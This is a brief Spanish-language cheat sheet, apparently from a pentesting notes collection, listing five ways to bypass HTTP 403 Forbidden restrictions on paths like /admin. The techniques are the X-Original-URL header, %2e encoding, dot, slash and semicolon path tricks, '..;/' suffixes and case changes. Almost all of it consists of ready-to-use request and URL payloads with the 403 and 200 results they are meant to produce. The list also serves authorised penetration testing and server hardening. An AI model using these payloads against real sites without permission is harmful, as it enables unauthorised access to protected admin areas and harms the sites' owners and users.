# Bypass 403 (Forbidden)

1 - Usando el header "X-Original-URL"

Respuesta del servidor

    GET /admin HTTP/1.1
    Host: host.com
    
Intenta este bypass

    GET /anything HTTP/1.1
    Host: host.com
    X-Original-URL: /admin
    
2 - Agregar %2e después de la primera barra inclinada
    
    http://host.com/admin => 403
    
Intenta este bypass    

    http://host.com/%2e/admin => 200
    
3 - Intente agregar un punto (.), una barra inclinada (/) y un punto y coma (;) en la URL

    http://host.com/admin => 403
    
Intenta este bypass

    http://host.com/secret/. => 200
    http://host.com//secret// => 200
    http://host.com/./secret/.. => 200
    http://host.com/;/secret => 200
    http://host.com/.;/secret => 200
    http://host.com//;//secret => 200
        
4 - Agregue "..;/" después del nombre del directorio 

    http://host.com/admin
    
Intenta este bypass

    http://host.com/admin..;/
    
5 - Intenta poner en mayúsculas la ruta en la url

    http://host.com/admin
    
Intenta este bypass

    http://host.com/aDmIN
